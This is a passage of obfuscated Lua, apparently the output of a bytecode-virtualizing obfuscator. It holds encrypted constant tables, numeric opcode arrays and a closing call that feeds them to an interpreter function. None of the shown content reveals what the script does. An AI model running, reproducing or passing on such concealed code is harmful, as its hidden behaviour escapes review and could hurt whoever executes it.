1,6,0,30,6,3,51,1,6,15,30,6,11,3,13,41,146,41,20,20,5},P={},U={{1,158},{1,160}},nParams=0},{K={1,14,{84,240,108,212,64,204,64,193},{112,250,87},{89,210,64,207,70},{115,200,88,198},{116,230,74,201,23},6,0,{102,196,69,204,79,219,69,222,66,201,122,221,81,223,65,195,85,199,83,217,91,192},{105,199,94,199,92,222,100,222,73,203,93},{118,198,90,204,68,223},{72,219},{76,200,94,206},{12,226,17,137,96,148,10,227},8,{110,194,88,195},{106,194,64,219},{110,193,75,213},48,{127,223,66,219,71,221,90,216},80,50,{105},{110},44,132,180,178,{108,220,66,207,104,207,75,209,35,160,54,166},{120,206,126,210,89},{78,218,94,209,91},{82,210,78,219,77,180},{90},{77,204,90},15,225,{1,141,14},{23,171,48,173,39,170,34},{7,145,22},{38,182,55,169,53},{19,132,20,137},{50,167,53,166},{5,166,38,191,43,184,31,164,52,170},{4,169,39,188,42,191,29,161,60,185,37,187,60,186},{30,172,41,191,35,191,124},{36,171,63,164},{39,170,52},{10,174,62,161,35,165,37,183,16,181,59,160,54,171,10,179,33,185},{21},{12,172,60,191,61,167,39,177,6,191,45,189}},C={39,5,6,5,16,40,5,39,4,6,4,69,4,52,6,28,7,6,6,30,6,1,69,4,52,1,51,1,6,0,28,3,6,6,30,6,5,39,4,6,2,69,4,42,6,13,51,6,69,1,13,51,1,6,12,6,5,13,51,1,6,15,39,5,13,51,1,6,14,39,7,13,39,6,51,1,28,9,6,8,30,6,11,69,4,6,10,39,1,28,21,6,20,30,6,23,30,69,0,52,0,51,0,6,0,28,3,6,6,30,6,13,39,4,6,22,69,4,6,5,6,13,69,1,13,51,0,6,17,28,3,6,6,30,6,13,6,13,6,13,6,13,69,1,13,39,6,51,1,51,5,6,10,39,0,28,21,6,20,30,6,23,30,69,0,52,3,51,3,6,0,28,3,6,6,30,6,13,39,4,6,16,69,4,6,5,6,13,69,1,13,51,3,6,17,28,3,6,6,30,6,13,39,4,6,19,69,4,6,13,6,13,69,1,13,39,6,51,1,6,18,51,4,6,29,5,5,6,10,39,3,51,4,69,4,28,21,6,20,30,6,23,30,69,0,52,2,51,2,6,0,28,3,6,6,30,6,13,39,4,6,28,69,4,6,5,6,13,69,1,13,51,2,6,17,28,3,6,6,30,6,13,39,4,6,31,69,4,6,13,6,13,69,1,13,39,6,51,1,51,7,6,10,39,2,28,21,6,20,30,6,23,30,69,0,52,13,51,13,6,0,28,3,6,6,30,6,5,39,4,6,30,69,4,42,6,5,6,13,69,1,13,51,13,6,17,28,3,6,6,30,6,13,39,4,6,25,69,4,6,13,6,13,69,1,13,51,13,6,24,28,21,6,24,30,6,27,30,13,28,26,6,37,30,39,13,10,59,6,36,51,1,13,59,6,39,51,4,13,69,7,17,4,6,38,6,38,26,6,33,3,59,15,416,17,4,39,12,6,32,0,15,471,51,1,6,35,39,12,6,34,3,59,15,447,17,4,51,4,6,45,3,59,37,15,458,17,4,39,12,6,44,3,59,15,458,17,4,51,4,6,47,3,13,41,471,39,7,6,46,28,3,6,6,30,6,13,6,13,6,13,39,5,51,6,39,4,6,5,69,4,16,26,39,4,6,2,69,4,16,69,1,13,39,7,6,41,31,28,40,6,6,30,6,13,28,43,6,42,30,6,13,39,7,6,53,30,6,52,30,39,7,6,55,30,6,52,30,21,62,7,-1,1,4,13,20,5},P={},U={{1,159},{1,22},{1,156},{1,39},{1,33},{1,34},{1,161},{1,35},{1,158},{1,160}},nParams=3},{K={{90,208,81},{94,252,125,244,71,211,77,214,74,193,101,200,68,198,88,152},{88,204,77},{73,222,114,239}},C={6,5,40,5,39,4,6,5,30,6,4,39,7,13,39,4,6,7,30,6,4,39,6,13,39,4,6,6,30,6,4,39,6,13,39,1,69,5,17,4,20,5},P={},U={{1,160},{1,148},{1,27},{1,26},{1,162}},nParams=0},{K={{94,206,79},{94,252,125,244,71,211,77,214,74,193,101,200,68,198,88,152},{92,210,83},{73,222,114,239}},C={6,5,40,5,39,4,6,5,30,6,4,39,7,13,39,4,6,7,30,6,4,39,6,13,39,4,6,6,30,6,4,39,6,13,39,1,69,5,17,4,20,5},P={},U={{1,160},{1,148},{1,31},{1,26},{1,162}},nParams=0},{K={{76,221,79,208},{94,252,125,244,71,211,77,214,74,193,101,200,68,198,88,152},{94,241,115,207,83,145},{120,237,79,204,112,228,102},130,80,10,{99,239,104},{102,246,119}},C={6,5,40,5,39,4,6,5,30,6,4,28,7,6,6,30,6,1,6,0,6,3,69,6,13,39,4,6,2,30,6,4,39,7,13,39,4,6,13,30,6,4,39,7,13,39,6,69,5,17,4,20,5},P={},U={{1,160},{1,148},{1,26},{1,162}},nParams=0},{K={{114,236,124,247,109,211},{122},{89,251,108,212,83,205,90},0,{92,193,79,212,66,215,118,207,93,205},{117,229,75,206,22},{79,199,84}},C={28,5,39,5,62,4,6,52,7,52,4,52,5,35,5,4,7,27,6,27,1,51,5,51,4,51,7,62,7,7,52,1,52,6,51,6,52,7,51,6,12,0,15,57,51,1,6,4,30,59,6,7,30,68,69,4,17,4,41,20,10,40,5,6,6,40,4,39,7,6,1,28,0,6,3,30,6,6,6,6,6,6,6,6,69,1,13,20,5},P={},U={{1,158},{1,159},{1,156}},nParams=0},{K={{107,238,116,240,107},100,7,2,{90,206,84,207},{109,196,81,208,69,194,67,243,81,217,79},{108,199,80,215,68,193,66,255,72,216,69,197,67,201},{85,194,86,203},12,144,{104,195,84,219,72,205,78,233,95,220,64,194},{67,213,90,198,88},3,9,{100,207,88,223,76,201,74,249,95,212,92},{67,197,74,194},{101,205,64,203},{12,133,67,202,25},{89,193,92,196,67,219,93,211}},C={6,5,52,7,6,4,6,7,19,6,6,3,59,15,25,17,4,51,4,28,1,6,0,30,6,3,30,3,15,33,6,2,52,7,41,97,6,13,6,13,26,6,12,3,59,15,57,17,4,51,4,28,1,6,0,30,6,15,30,3,15,65,6,14,52,7,41,97,6,9,6,6,48,6,8,3,59,15,89,17,4,51,4,28,1,6,0,30,6,11,30,3,15,97,6,10,52,7,41,97,31,39,5,39,4,6,21,30,6,20,5,51,7,28,23,51,5,62,4,-1,1,4,17,4,20,5},P={},U={{1,163},{1,7}},nParams=2},{K={7,49,{86,251,102,227,78,198,70},{91,241,85,204},{77,201,70,202,87,247,77,207,65,220},{118,200,81,202,70,201,67}},C={6,5,6,5,26,6,4,3,59,15,38,17,4,51,4,37,59,15,38,17,4,51,5,6,7,30,28,6,6,7,30,6,1,30,3,15,55,39,5,6,0,39,5,6,0,30,37,13,41,55,20,5},P={},U={{1,45}},nParams=2}}
local _lI_25={28,5,59,6,4,30,68,6,7,69,7,52,5,28,5,59,6,4,30,68,6,6,69,7,52,4,28,5,59,6,4,30,68,6,1,69,7,52,7,28,5,59,6,4,30,68,6,0,69,7,52,6,28,5,59,6,4,30,68,6,3,69,7,52,1,28,5,59,6,4,30,68,6,2,69,7,52,0,28,5,59,6,4,30,68,6,13,69,7,52,3,51,5,6,12,30,52,2,51,2,6,15,30,6,14,3,52,13,6,9,52,12,6,8,52,15,6,11,52,14,54,4,52,9,54,7,52,8,54,6,52,11,54,1,52,10,51,10,69,5,17,4,28,10,6,21,30,54,0,69,4,17,4,10,52,21,6,20,52,20,54,3,52,23,28,10,6,21,30,54,2,69,4,17,4,6,23,6,23,26,6,22,3,59,15,186,17,4,51,13,37,15,251,28,17,6,16,30,6,19,51,12,51,15,51,20,69,1,52,22,51,23,51,20,69,4,17,4,51,7,6,18,30,59,6,29,30,68,54,13,69,7,17,4,51,2,6,28,30,59,6,29,30,68,54,12,69,7,17,4,20,5,41,251,28,31,6,30,30,6,25,30,6,24,30,52,17,28,27,6,26,30,51,17,6,37,71,6,36,6,39,69,6,52,16,54,15,52,19,54,14,52,18,28,38,6,33,30,6,32,6,32,6,32,69,6,52,29,28,38,6,33,30,6,35,6,35,6,35,69,6,52,28,28,38,6,33,30,6,34,6,34,6,34,69,6,52,31,28,38,6,33,30,6,45,6,45,6,45,69,6,52,30,28,38,6,33,30,6,44,6,44,6,44,69,6,52,25,28,38,6,33,30,6,47,6,47,6,47,69,6,52,24,28,38,6,33,30,6,46,6,46,6,46,69,6,52,27,28,38,6,33,30,6,41,6,40,6,40,69,6,52,26,28,38,6,33,30,6,40,6,43,6,42,69,6,52,37,28,38,6,33,30,6,53,6,53,6,53,69,6,52,36,28,38,6,33,30,6,52,6,52,6,52,69,6,52,39,28,38,6,33,30,6,55,6,55,6,55,69,6,52,38,54,9,52,33,54,8,52,32,54,11,52,35,54,10,52,34,54,21,52,45,54,20,52,44,28,54,6,49,30,6,48,69,4,52,47,51,47,6,15,6,51,13,51,47,6,50,44,13,51,47,6,61,28,60,6,61,30,6,63,30,13,51,47,6,62,49,13,51,47,6,57,51,2,59,6,56,30,68,6,59,69,7,13,51,19,6,58,69,4,51,19,6,69,69,4,52,41,52,46,28,54,6,49,30,6,68,69,4,52,40,51,40,6,71,28,70,6,49,30,6,32,51,46,6,32,51,41,69,1,13,51,40,6,65,28,70,6,49,30,6,64,51,46,42,6,67,71,6,64,51,41,42,6,67,71,69,1,13,51,40,6,66,51,29,13,51,40,6,77,6,32,13,51,40,6,76,49,13,51,40,6,79,49,13,51,40,6,78,49,13,51,40,6,57,51,47,13,51,33,51,40,6,73,69,7,17,4,51,32,51,40,6,72,51,25,69,6,17,4,51,19,6,75,69,4,52,43,28,54,6,49,30,6,68,69,4,52,42,51,42,6,71,28,70,6,49,30,6,72,6,32,6,32,51,43,69,1,13,51,42,6,66,51,28,13,51,42,6,77,6,32,13,51,42,6,57,51,40,13,51,34,51,42,6,74,51,2,6,15,30,5,6,85,51,27,28,60,6,84,30,6,87,30,69,0,52,53,51,53,6,71,28,70,6,49,30,6,72,51,19,6,86,69,4,42,6,72,6,32,69,1,13,51,53,6,65,28,70,6,49,30,6,32,51,19,6,81,69,4,6,32,6,32,69,1,13,51,45,51,42,6,80,28,38,6,33,30,6,83,6,82,6,82,69,6,6,81,69,1,52,52,51,52,6,71,31,28,70,6,49,30,6,32,51,19,6,93,69,4,6,32,51,19,6,92,62,4,-1,1,4,13,51,52,6,65,28,70,6,49,30,6,72,51,19,6,95,69,4,42,6,64,51,19,6,85,69,4,42,69,1,13,51,45,51,42,6,94,51,26,6,85,69,1,52,55,51,55,6,71,31,28,70,6,49,30,6,32,51,19,6,92,69,4,6,32,51,19,6,92,62,4,-1,1,4,13,51,55,6,65,28,70,6,49,30,6,72,51,19,6,89,69,4,42,6,64,51,19,6,85,69,4,42,69,1,13,51,55,6,88,30,59,6,29,30,68,54,23,69,7,17,4,51,52,6,88,30,59,6,29,30,68,54,22,69,7,17,4,51,19,6,91,69,4,52,54,28,54,6,49,30,6,68,69,4,52,49,51,49,6,71,28,70,6,49,30,6,72,6,32,6,32,51,54,69,1,13,51,49,6,65,28,70,6,49,30,6,32,6,32,6,32,51,43,69,1,13,51,49,6,66,51,28,13,51,49,6,77,6,32,13,51,49,6,57,51,40,13,28,54,6,49,30,6,68,69,4,52,48,51,48,6,71,28,70,6,49,30,6,72,6,32,6,32,6,72,69,1,13,51,48,6,65,28,70,6,49,30,6,32,6,32,6,72,6,72,42,69,1,13,51,48,6,66,51,25,13,51,48,6,77,6,32,13,51,48,6,57,51,49,13,10,59,6,72,6,7,13,59,6,67,6,90,13,59,6,101,6,100,13,59,6,103,6,102,13,52,51,10,52,50,10,52,61,10,52,60,51,43,51,54,16,52,63,51,41,51,63,21,52,62,51,19,6,35,69,4,52,57,51,19,6,97,69,4,52,56,51,19,6,103,69,4,52,59,54,17,52,58,28,27,6,96,30,51,46,51,51,46,71,69,4,52,69,54,16,52,68,28,99,51,51,62,4,6,52,65,52,70,52,71,35,71,70,65,27,64,27,67,51,71,51,70,51,65,62,7,7,52,67,52,64,51,64,52,65,51,64,12,0,15,1593,51,58,69,5,52,66,51,60,51,67,51,66,13,51,64,6,72,21,51,69,26,52,77,28,54,6,49,30,6,98,69,4,52,76,51,76,6,71,28,70,6,49,30,6,32,51,69,6,32,51,54,69,1,13,51,76,6,65,28,70,6,49,30,6,32,51,77,6,32,6,32,69,1,13,51,76,6,109,6,72,13,51,76,6,77,6,32,13,51,76,6,108,51,67,13,51,76,6,111,51,36,13,51,76,6,110,51,19,6,81,69,4,13,51,76,6,84,28,60,6,84,30,6,87,30,13,51,76,6,105,44,13,51,76,6,57,51,49,13,51,50,51,67,51,76,13,28,54,6,49,30,6,68,69,4,52,79,51,79,6,71,31,28,70,6,49,30,6,32,51,69,51,19,6,104,69,4,21,6,32,51,19,6,67,62,4,-1,1,4,13,51,79,6,65,28,70,6,49,30,6,32,51,77,51,19,6,35,69,4,16,6,72,51,19,6,67,69,4,42,69,1,13,51,79,6,66,51,27,13,51,79,6,77,6,32,13,51,79,6,107,44,13,51,79,6,57,51,49,13,51,61,51,67,51,79,13,51,76,6,88,30,59,6,29,30,68,54,19,69,7,17,4,27,66,27,77,27,76,27,79,41,1282,51,68,6,7,69,4,17,4,51,60,6,7,30,52,78,51,19,6,41,69,4,52,73,51,57,51,73,16,51,57,16,52,72,51,46,51,72,21,51,57,21,52,75,51,34,51,78,6,106,6,117,51,36,28,60,6,84,30,6,87,30,69,0,52,74,51,74,6,71,31,28,70,6,49,30,6,32,51,73,6,32,51,19,6,116,62,4,-1,1,4,13,51,74,6,65,28,70,6,49,30,6,32,51,57,6,32,51,57,69,1,13,28,54,6,49,30,6,119,69,4,52,85,51,85,6,71,28,70,6,49,30,6,32,51,73,6,32,51,62,51,19,6,116,69,4,21,51,57,6,67,26,21,51,19,6,67,69,4,21,69,1,13,51,85,6,65,28,70,6,49,30,6,32,51,57,6,32,51,57,51,19,6,45,69,4,16,69,1,13,51,85,6,66,51,31,13,51,85,6,77,6,32,13,51,85,6,118,51,19,6,67,69,4,13,51,85,6,113,51,36,13,51,85,6,112,28,70,6,49,30,6,32,6,32,6,32,6,32,69,1,13,51,85,6,57,51,78,13,51,33,51,85,6,103,69,7,17,4,51,32,51,85,6,72,51,25,69,6,17,4,28,54,6,49,30,6,115,69,4,52,84,51,84,6,114,28,60,6,114,30,6,125,30,13,51,84,6,124,31,28,127,6,49,30,6,32,51,19,6,67,62,4,-1,1,4,13,51,84,6,57,51,85,13,31,51,35,51,85,51,19,6,101,62,4,-1,1,4,17,4,51,34,51,78,6,126,6,85,51,27,28,60,6,84,30,6,87,30,69,0,52,87,51,87,6,71,31,28,70,6,49,30,6,32,51,75,6,32,51,19,6,116,62,4,-1,1,4,13,51,87,6,65,28,70,6,49,30,6,32,51,72,6,32,51,57,69,1,13,28,54,6,49,30,6,68,69,4,52,86,51,86,6,71,31,28,70,6,49,30,6,32,51,75,6,32,51,19,6,121,62,4,-1,1,4,13,51,86,6,65,28,70,6,49,30,6,32,51,72,6,32,51,57,51,19,6,45,69,4,16,69,1,13,51,86,6,66,51,31,13,51,86,6,77,6,32,13,51,86,6,57,51,78,13,51,33,51,86,6,103,69,7,17,4,51,32,51,86,6,72,51,25,69,6,17,4,31,51,35,51,86,51,19,6,120,62,4,-1,1,4,17,4,51,34,51,86,6,123,6,117,51,39,69,1,52,81,51,81,6,71,28,70,6,49,30,6,72,6,32,6,72,6,32,69,1,13,51,81,6,122,49,13,51,57,51,19,6,45,69,4,16,51,19,6,121,69,4,16,51,57,16,52,80,28,27,6,96,30,51,75,51,57,21,6,67,71,69,4,52,83,54,18,52,82,51,82,6,133,51,30,6,32,69,6,52,93,51,82,6,132,28,38,6,33,30,6,45,6,83,6,45,69,6,6,72,69,6,52,92,51,82,6,135,28,38,6,33,30,6,45,6,134,6,44,69,6,6,67,69,6,52,95,51,82,6,129,28,38,6,33,30,6,128,6,82,6,82,69,6,6,101,69,6,52,94,51,82,6,131,51,26,6,103,69,6,52,89,51,82,6,130,28,38,6,33,30,6,128,6,82,6,128,69,6,6,120,69,6,52,88,51,82,6,141,28,38,6,33,30,6,45,6,45,6,42,69,6,6,73,69,6,52,91,51,82,6,140,28,38,6,33,30,6,82,6,121,6,83,69,6,6,143,69,6,52,90,51,82,6,142,28,38,6,33,30,6,53,6,82,6,40,69,6,6,35,69,6,52,101,51,82,6,137,28,38,6,33,30,6,40,6,45,6,134,69,6,6,117,69,6,52,100,51,82,6,136,28,38,6,33,30,6,42,6,45,6,45,69,6,6,81,49,69,1,52,103,12,52,102,10,52,97,10,52,96,54,29,52,99,51,93,6,88,30,59,6,29,30,68,54,28,69,7,17,4,51,95,6,88,30,59,6,29,30,68,54,31,69,7,17,4,51,94,6,88,30,59,6,29,30,68,54,30,69,7,17,4,51,89,6,88,30,59,6,29,30,68,54,25,69,7,17,4,51,88,6,88,30,59,6,29,30,68,54,24,69,7,17,4,51,91,6,88,30,59,6,29,30,68,54,27,69,7,17,4,51,90,6,88,30,59,6,29,30,68,54,26,69,7,17,4,51,101,6,88,30,59,6,29,30,68,54,37,69,7,17,4,51,100,6,88,30,59,6,29,30,68,54,36,69,7,17,4,51,103,6,88,30,59,6,29,30,68,54,39,69,7,17,4,51,92,6,88,30,59,6,29,30,68,54,38,69,7,17,4,28,10,6,21,30,54,33,69,4,17,4,51,60,6,90,30,52,98,51,62,51,19,6,116,69,4,21,51,57,6,103,26,21,51,19,6,40,69,4,21,51,19,6,97,69,4,21,51,19,6,89,69,4,21,52,109,51,34,51,98,6,139,6,117,51,36,28,60,6,84,30,6,87,30,69,0,52,108,51,108,6,71,31,28,70,6,49,30,6,72,51,57,42,6,67,26,6,32,51,19,6,104,62,4,-1,1,4,13,51,108,6,65,28,70,6,49,30,6,32,51,57,6,32,51,57,69,1,13,51,44,51,98,6,138,49,69,6,52,111,51,111,6,84,28,60,6,84,30,6,149,30,13,51,111,6,110,51,19,6,85,69,4,13,51,111,6,71,28,70,6,49,30,6,72,51,57,42,6,67,26,6,32,51,109,69,1,13,51,111,6,65,28,70,6,49,30,6,32,51,57,6,32,51,57,51,19,6,116,69,4,16,69,1,13,51,57,51,19,6,116,69,4,16,51,109,16,51,57,16,52,110,51,45,51,98,6,148,51,30,6,85,69,1,52,105,51,105,6,71,31,28,70,6,49,30,6,72,51,57,42,6,67,26,6,32,51,19,6,89,62,4,-1,1,4,13,51,105,6,65,28,70,6,49,30,6,32,51,57,6,32,51,110,69,1,13,51,32,51,105,6,72,51,36,69,6,17,4,10,59,6,72,10,59,6,72,6,151,13,59,6,67,6,150,13,13,59,6,67,10,59,6,72,6,145,13,59,6,67,6,144,13,13,59,6,101,10,59,6,72,6,147,13,59,6,67,6,146,13,13,59,6,103,10,59,6,72,6,157,13,59,6,67,6,156,13,13,59,6,120,10,59,6,72,6,159,13,59,6,67,6,158,13,13,59,6,73,10,59,6,72,6,153,13,59,6,67,6,152,13,13,59,6,143,10,59,6,72,6,155,13,59,6,67,6,154,13,13,52,104,28,54,6,49,30,6,68,69,4,52,107,51,107,6,71,31,28,70,6,49,30,6,72,51,57,42,6,67,26,6,32,51,19,6,165,62,4,-1,1,4,13,51,107,6,65,28,70,6,49,30,6,32,51,57,6,32,51,110,51,19,6,91,69,4,16,69,1,13,51,107,6,109,6,72,13,51,107,6,78,49,13,51,107,6,57,51,98,13,28,54,6,49,30,6,115,69,4,52,106,51,106,6,164,28,60,6,164,30,6,167,30,13,51,106,6,124,31,28,127,6,49,30,6,32,51,19,6,101,62,4,-1,1,4,13,51,106,6,57,51,107,13,28,99,51,104,62,4,6,52,119,52,116,52,117,35,117,116,119,27,118,27,113,51,117,51,116,51,119,62,7,7,52,113,52,118,51,118,52,119,51,118,12,0,15,3323,51,45,51,107,51,113,6,72,30,51,31,6,117,69,1,52,112,51,112,6,111,51,39,13,51,112,6,71,31,28,70,6,49,30,6,32,51,19,6,166,69,4,6,32,51,19,6,45,62,4,-1,1,4,13,51,113,6,67,30,52,115,51,112,6,88,30,59,6,29,30,68,54,32,69,7,17,4,27,112,27,115,41,3221,51,110,51,19,6,91,69,4,16,51,19,6,165,69,4,16,51,57,16,52,114,51,34,51,98,6,161,6,117,51,36,28,60,6,84,30,6,87,30,69,0,52,125,51,125,6,71,31,28,70,6,49,30,6,72,51,57,42,6,67,26,6,32,51,19,6,34,62,4,-1,1,4,13,51,125,6,65,28,70,6,49,30,6,32,51,57,6,32,51,114,69,1,13,51,46,51,57,6,67,26,21,51,19,6,42,69,4,21,51,57,21,52,124,51,44,51,98,6,160,69,7,52,127,51,127,6,71,28,70,6,49,30,6,32,51,124,6,32,51,56,69,1,13,51,127,6,65,28,70,6,49,30,6,32,51,57,6,32,51,114,51,19,6,104,69,4,16,69,1,13,51,45,51,98,6,163,51,30,6,81,69,1,52,126,51,126,6,71,28,70,6,49,30,6,32,51,19,6,162,69,4,6,32,51,56,69,1,13,51,126,6,65,28,70,6,49,30,6,32,51,57,51,124,16,51,57,16,6,32,51,114,51,19,6,104,69,4,16,69,1,13,54,35,52,121,51,105,6,88,30,59,6,29,30,68,54,34,69,7,17,4,51,126,6,88,30,59,6,29,30,68,54,45,69,7,17,4,51,127,6,173,30,59,6,29,30,68,54,44,69,7,17,4,51,60,6,100,30,52,120,51,57,52,123,54,47,52,122,54,46,52,133,51,122,51,120,6,172,51,123,69,6,17,4,51,123,51,19,6,104,69,4,16,52,123,51,44,51,120,6,175,69,7,52,132,51,132,6,71,28,70,6,49,30,6,32,51,46,51,57,6,67,26,21,51,19,6,128,69,4,21,51,57,21,6,32,51,56,69,1,13,51,132,6,65,28,70,6,49,30,6,32,51,57,6,32,51,123,69,1,13,51,45,51,120,6,163,51,30,6,81,69,1,52,135,51,135,6,71,28,70,6,49,30,6,32,51,19,6,174,69,4,6,32,51,56,69,1,13,51,135,6,65,28,70,6,49,30,6,32,51,46,51,57,21,51,19,6,174,69,4,21,6,32,51,123,69,1,13,51,32,51,135,6,72,51,36,69,6,17,4,51,135,6,88,30,59,6,29,30,68,54,41,69,7,17,4,51,123,51,56,16,51,57,6,67,26,16,52,123,51,122,51,120,6,169,51,123,69,6,17,4,51,123,51,19,6,104,69,4,16,52,123,28,54,6,49,30,6,68,69,4,52,134,51,134,6,71,31,28,70,6,49,30,6,72,51,57,42,6,67,26,6,32,51,19,6,168,62,4,-1,1,4,13,51,134,6,65,28,70,6,49,30,6,32,51,57,6,32,51,123,69,1,13,51,134,6,66,51,31,13,51,134,6,77,6,32,13,51,134,6,57,51,120,13,51,33,51,134,6,103,69,7,17,4,51,32,51,134,6,72,51,25,69,6,17,4,31,51,35,51,134,51,19,6,120,62,4,-1,1,4,17,4,51,34,51,134,6,171,6,81,51,39,69,1,52,129,51,129,6,71,28,70,6,49,30,6,72,6,32,6,72,6,32,69,1,13,51,129,6,122,49,13,51,123,51,19,6,168,69,4,16,51,59,16,52,123,51,133,6,170,51,30,51,57,51,123,51,46,51,57,6,67,26,21,69,0,52,128,51,128,6,88,30,59,6,29,30,68,54,40,69,7,17,4,51,123,51,56,16,51,57,6,67,26,16,52,123,51,122,51,120,6,181,51,123,69,6,17,4,51,123,51,19,6,104,69,4,16,52,123,28,27,6,96,30,51,46,51,57,6,101,26,21,6,67,71,69,4,52,131,51,133,6,180,28,38,6,33,30,6,128,6,82,6,82,69,6,51,57,51,123,51,131,69,0,52,130,51,133,6,183,51,26,51,57,51,131,16,51,57,16,51,123,51,131,69,0,52,141,51,133,6,182,28,38,6,33,30,6,42,6,45,6,45,69,6,51,57,51,123,51,56,16,51,59,16,51,46,51,57,6,67,26,21,69,0,52,140,51,130,6,88,30,59,6,29,30,68,54,43,69,7,17,4,51,141,6,88,30,59,6,29,30,68,54,42,69,7,17,4,51,140,6,88,30,59,6,29,30,68,54,53,69,7,17,4,51,123,51,56,16,51,59,16,51,56,16,51,57,6,67,26,16,52,123,51,122,51,120,6,177,51,123,69,6,17,4,51,123,51,19,6,104,69,4,16,52,123,28,27,6,96,30,51,46,51,57,6,101,26,21,6,67,71,69,4,52,143,51,133,6,176,51,30,51,57,51,123,51,143,69,0,52,142,51,133,6,179,51,30,51,57,51,143,16,51,57,16,51,123,51,143,69,0,52,137,51,133,6,178,51,30,51,57,51,123,51,56,16,51,59,16,51,143,69,0,52,136,51,133,6,189,51,30,51,57,51,143,16,51,57,16,51,123,51,56,16,51,59,16,51,143,69,0,52,139,44,52,138,51,142,6,88,30,59,6,29,30,68,54,52,69,7,17,4,44,52,149,12,52,148,51,137,6,88,30,59,6,29,30,68,54,55,69,7,17,4,51,136,6,88,30,59,6,29,30,68,54,54,69,7,17,4,51,139,6,88,30,59,6,29,30,68,54,49,69,7,17,4,51,60,6,102,30,52,151,28,54,6,49,30,6,68,69,4,52,150,51,150,6,71,31,28,70,6,49,30,6,72,6,32,6,32,51,19,6,40,62,4,-1,1,4,13,51,150,6,66,51,28,13,51,150,6,77,6,32,13,51,150,6,57,51,151,13,51,34,51,150,6,188,6,117,51,36,28,60,6,84,30,6,87,30,69,0,6,71,28,70,6,49,30,6,32,51,19,6,83,69,4,6,72,6,32,69,1,13,10,52,145,10,59,6,72,6,191,13,59,6,67,6,190,13,59,6,101,6,185,13,59,6,103,6,184,13,52,144,28,99,51,144,62,4,6,52,157,52,146,52,147,35,147,146,157,27,156,27,159,51,147,51,146,51,157,62,7,7,52,159,52,156,51,156,52,157,51,156,12,0,15,4764,51,45,51,150,51,159,51,31,6,117,69,1,52,158,51,158,6,71,31,28,70,6,49,30,6,32,51,19,6,75,69,4,6,32,51,19,6,45,62,4,-1,1,4,13,51,158,6,65,28,70,6,49,30,6,72,51,19,6,121,69,4,6,120,51,156,21,26,42,51,57,21,6,64,51,19,6,81,69,4,42,69,1,13,51,145,51,159,51,158,13,27,158,41,4645,28,54,6,49,30,6,119,69,4,52,153,51,153,6,71,28,70,6,49,30,6,72,6,32,6,32,51,62,51,19,6,40,69,4,21,69,1,13,51,153,6,65,31,28,70,6,49,30,6,32,6,32,6,32,51,19,6,40,62,4,-1,1,4,13,51,153,6,66,51,29,13,51,153,6,77,6,32,13,51,153,6,118,51,19,6,67,69,4,13,51,153,6,113,51,36,13,51,153,6,112,28,70,6,49,30,6,32,6,32,6,32,6,32,69,1,13,51,153,6,57,51,151,13,31,51,35,51,153,51,19,6,101,62,4,-1,1,4,17,4,28,54,6,49,30,6,115,69,4,52,152,51,152,6,114,28,60,6,114,30,6,125,30,13,51,152,6,124,31,28,127,6,49,30,6,32,51,19,6,72,62,4,-1,1,4,13,51,152,6,57,51,153,13,10,52,155,6,32,52,154,6,191,52,165,54,48,52,164,54,51,52,167,54,50,52,166,28,187,6,186,51,166,13,51,145,6,191,30,6,88,30,59,6,29,30,68,54,61,69,7,17,4,51,145,6,190,30,6,88,30,59,6,29,30,68,54,60,69,7,17,4,51,145,6,185,30,6,88,30,59,6,29,30,68,54,63,69,7,17,4,51,145,6,184,30,6,88,30,59,6,29,30,68,54,62,69,7,17,4,51,3,6,197,30,59,6,29,30,68,54,57,69,7,17,4,51,166,6,196,6,199,6,198,51,12,5,69,6,17,4,51,166,6,196,6,199,6,193,28,192,51,2,6,195,30,69,4,5,69,6,17,4,51,6,6,194,30,59,6,29,30,68,54,56,69,7,17,4,20,5}
return _0l0I00(_l0_24,_lI_25,_O10O1,_0lI26)
